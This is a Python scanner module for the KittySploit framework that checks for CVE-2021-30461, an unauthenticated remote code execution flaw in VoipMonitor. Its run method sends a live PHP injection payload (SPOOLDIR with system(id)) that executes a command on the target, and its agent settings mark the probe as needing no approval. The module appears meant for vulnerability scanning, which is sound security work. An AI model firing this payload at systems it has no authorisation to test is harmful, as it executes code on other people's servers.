#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VoipMonitor prior to 24."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'VoipMonitor <24.61 - Remote Code Execution Detection',
        'description': 'VoipMonitor prior to 24.61 is susceptible to remote code execution vulnerabilities because of its use of user supplied data via its web interface, allowing remote unauthenticated users to trigger a remote PHP code execution vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'rce', 'voipmonitor', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-30461',
            'https://ssd-disclosure.com/ssd-advisory--voipmonitor-unauth-rce',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/openx-org/BLEN',
        ],
        'cve': 'CVE-2021-30461',
    }

    def run(self):
        path = '/index.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded'}, data='SPOOLDIR=test".system(id)."&recheck=Recheck\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('uid=', 'gid=', 'groups=', 'VoIPmonitor installation',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='VoipMonitor <24.61 - Remote Code Execution detected', path=path)
            return True
        return False

